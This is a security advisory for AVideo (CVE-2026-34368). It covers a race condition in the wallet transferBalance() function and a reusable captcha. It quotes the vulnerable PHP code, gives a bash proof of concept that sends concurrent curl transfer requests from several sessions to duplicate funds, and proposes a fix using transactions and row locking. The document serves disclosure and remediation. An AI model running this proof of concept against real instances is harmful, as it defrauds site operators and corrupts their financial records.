# [M] AVideo Vulnerable to Wallet Balance Double-Spend via TOCTOU Race Condition in transferBalance

## Summary
Severity: Medium
Advisory: GHSA-h54m-c522-h6qr
CVE: CVE-2026-34368
CWE: CWE-362
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-03-30
Source: https://github.com/advisories/GHSA-h54m-c522-h6qr
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `transferBalance()` method in `plugin/YPTWallet/YPTWallet.php` contains a Time-of-Check-Time-of-Use (TOCTOU) race condition. The method reads the sender's wallet balance, checks sufficiency in PHP, then writes the new balance — all without database transactions or row-level locking. An attacker with multiple authenticated sessions can send concurrent transfer requests that all read the same stale balance, each passing the balance check independently, resulting in only one deduction being applied while the recipient is credited multiple times.

## Details

The vulnerable code path in `plugin/YPTWallet/YPTWallet.php:450-517`:

```php
// Line 473-474: READ - fetch current balance (plain SELECT, no FOR UPDATE)
$senderWallet = self::getWallet($fromUserId);
$senderBalance = $senderWallet->getBalance();
$senderNewBalance = $senderBalance - $amount;

// Line 477: CHECK - verify sufficient funds in PHP
if ($senderNewBalance < 0) {
    return false;
}

// Line 486-487: WRITE - set new balance (plain UPDATE)
$senderWallet->setBalance($senderNewBalance);
$senderWalletId = $senderWallet->save();

// Line 497-502: Credit receiver (also plain SELECT + UPDATE)
$receiverWallet = self::getWallet($toUserId);
$receiverBalance = $receiverWallet->getBalance();
$receiverNewBalance = $receiverBalance + $amount;
$receiverWallet->setBalance($receiverNewBalance);
$receiverWalletId = $receiverWallet->save();
```

The `getWallet()` method (`YPTWallet.php:244`) calls `Wallet::getFromUser()` (`Wallet.php:69-84`) which executes a plain `SELECT * FROM wallet WHERE users_id = $users_id` with no `FOR UPDATE` clause. The `save()` method (`Wallet.php:105`) calls `ObjectYPT::save()` (`Object.php:293`) which executes a plain `UPDATE` — no transaction wrapping.

**Race window**: Between the SELECT (step 1) and UPDATE (step 3), all concurrent requests see the same original balance. Each independently computes `original - amount`, passes the check, and writes back. The last writer wins for the sender (only one deduction effective), but the receiver gets credited once per request.

**Why concurrent requests succeed**: PHP's file-based session locking serializes requests per session. However, an attacker can create multiple login sessions (different PHPSESSID cookies) for the same user account. Each session has its own lock and can execute concurrently. Each session needs its own captcha, but the captcha validation in `objects/captcha.php:58-73` compares `$_SESSION['palavra']` without unsetting it after validation, allowing unlimited reuse within each session.

Entry point: `plugin/YPTWallet/view/transferFunds.json.php:39` calls `YPTWallet::transferBalance(User::getId(), $_POST['users_id'], $_POST['value'])` — requires only `User::isLogged()` and a valid captcha.

## PoC

```bash
# Prerequisites: Attacker has a registered account with $10 wallet balance
# Accomplice has a registered account (recipient)

TARGET="https://target-avideo-instance"
ACCOMPLICE_ID=123  # recipient user ID

# Step 1: Create 5 independent sessions for the same attacker account
declare -a SESSIONS
declare -a CAPTCHA_ANSWERS

for i in $(seq 1 5); do
  # Login and capture session cookie
  COOKIE=$(curl -s -c - "$TARGET/objects/login.json.php" \
    -d 'user=attacker&pass=attackerpass' | grep PHPSESSID | awk '{print $NF}')
  
  # Load captcha to populate $_SESSION['palavra']
  curl -s -b "PHPSESSID=$COOKIE" "$TARGET/objects/captcha.php" -o "captcha_$i.png"
  
  SESSIONS[$i]=$COOKIE
  echo "Session $i: $COOKIE — solve captcha_$i.png manually"
done

# Step 2: After solving captchas, fire all 5 transfer requests simultaneously
# Each requests $10 transfer — all will read balance=$10 concurrently
for i in $(seq 1 5); do
  curl -s -b "PHPSESSID=${SESSIONS[$i]}" \
    "$TARGET/plugin/YPTWallet/view/transferFunds.json.php" \
    -d "users_id=$ACCOMPLICE_ID&value=10&captcha=${CAPTCHA_ANSWERS[$i]}" &
done
wait

# Expected result:
# - Attacker balance: $0 (last write wins, sets balance to 10-10=0)
# - Accomplice balance: credited $10 x N successful races (up to $50)
# - Net money created from nothing: up to $40
```

## Impact

An authenticated attacker can exploit this race condition to:

- **Create wallet balance from nothing**: With a $10 balance and N concurrent requests, the recipient can receive up to $10×N while the sender only loses $10.
- **Bypass pay-per-view charges**: Inflate wallet balance, then purchase paid content without real payment.
- **Bypass subscription fees**: Use inflated balance to purchase subscriptions.
- **Financial integrity compromise**: The wallet ledger becomes inconsistent — total balances across all users no longer match total deposits.

The attack requires solving one captcha per session (captchas are reusable within a session), creating multiple login sessions, and timing concurrent requests — achievable with basic scripting.

## Recommended Fix

Replace the read-check-write pattern with an atomic database operation using a transaction and row-level locking:

```php
public static function transferBalance($fromUserId, $toUserId, $amount, $customDescription = "", $forceTransfer = false)
{
    global $global;
    
    // ... existing auth and validation checks ...
    
    $amount = floatval($amount);
    if ($amount <= 0) {
        return false;
    }

    // Use a database transaction with row-level locking
    $global['mysqli']->autocommit(false);
    $global['mysqli']->begin_transaction();
    
    try {
        // Lock sender row and read balance atomically
        $sql = "SELECT id, balance FROM wallet WHERE users_id = ? FOR UPDATE";
        $stmt = $global['mysqli']->prepare($sql);
        $stmt->bind_param("i", $fromUserId);
        $stmt->execute();
        $result = $stmt->get_result();
        $senderRow = $result->fetch_assoc();
        $stmt->close();
        
        if (empty($senderRow)) {
            $global['mysqli']->rollback();
            return false;
        }
        
        $senderBalance = floatval($senderRow['balance']);
        $senderNewBalance = $senderBalance - $amount;
        
        if ($senderNewBalance < 0) {
            $global['mysqli']->rollback();
            return false;
        }
        
        // Atomic deduction
        $sql = "UPDATE wallet SET balance = ? WHERE id = ? AND balance >= ?";
        $stmt = $global['mysqli']->prepare($sql);
        $stmt->bind_param("did", $senderNewBalance, $senderRow['id'], $amount);
        $stmt->execute();
        
        if ($stmt->affected_rows === 0) {
            $global['mysqli']->rollback();
            $stmt->close();
            return false;
        }
        $stmt->close();
        
        // Credit receiver (also locked)
        $sql = "SELECT id, balance FROM wallet WHERE users_id = ? FOR UPDATE";
        $stmt = $global['mysqli']->prepare($sql);
        $stmt->bind_param("i", $toUserId);
        $stmt->execute();
        $result = $stmt->get_result();
        $receiverRow = $result->fetch_assoc();
        $stmt->close();
        
        $receiverNewBalance = floatval($receiverRow['balance']) + $amount;
        $sql = "UPDATE wallet SET balance = ? WHERE id = ?";
        $stmt = $global['mysqli']->prepare($sql);
        $stmt->bind_param("di", $receiverNewBalance, $receiverRow['id']);
        $stmt->execute();
        $stmt->close();
        
        $global['mysqli']->commit();
        
        // ... log entries ...
        
    } catch (Exception $e) {
        $global['mysqli']->rollback();
        return false;
    } finally {
        $global['mysqli']->autocommit(true);
    }
}
```

Additionally, fix the captcha reuse issue in `objects/captcha.php:58-73` by unsetting `$_SESSION['palavra']` after successful validation:

```php
public static function validation($word)
{
    // ... existing checks ...
    $validation = (strcasecmp($word, $_SESSION["palavra"]) == 0);
    if ($validation) {
        unset($_SESSION["palavra"]); // Consume the captcha token
    }
    return $validation;
}
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-h54m-c522-h6qr
- https://nvd.nist.gov/vuln/detail/CVE-2026-34368
- https://github.com/WWBN/AVideo/commit/34132ad5159784bfc7ba0d7634bb5c79b769202d
- https://github.com/WWBN/AVideo
